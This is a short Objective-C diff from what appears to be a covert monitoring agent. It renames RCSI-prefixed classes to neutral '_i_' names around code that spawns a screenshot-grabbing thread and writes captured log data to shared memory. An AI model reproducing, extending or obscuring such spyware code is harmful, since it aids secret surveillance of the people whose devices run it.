@@ -187,7 +187,7 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
   
   [rawAdditionalHeader release];
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: logData];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: logData];
   
   [logData release];
   
@@ -228,7 +228,7 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
     shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
     
     
-    [[RCSISharedMemory sharedInstance] writeIpcBlob: logData];
+    [[_i_SharedMemory sharedInstance] writeIpcBlob: logData];
     
     [logData release];
     
@@ -259,7 +259,7 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
     {
       [self setMAgentStatus: AGENT_STATUS_RUNNING];
     
-      RCSIThread *agentThread = [[RCSIThread alloc] initWithTarget: self
+      _i_Thread *agentThread = [[_i_Thread alloc] initWithTarget: self
                                                           selector: @selector(_grabScreenshot) 
                                                             object: nil
                                                            andName: @"scrsht"];
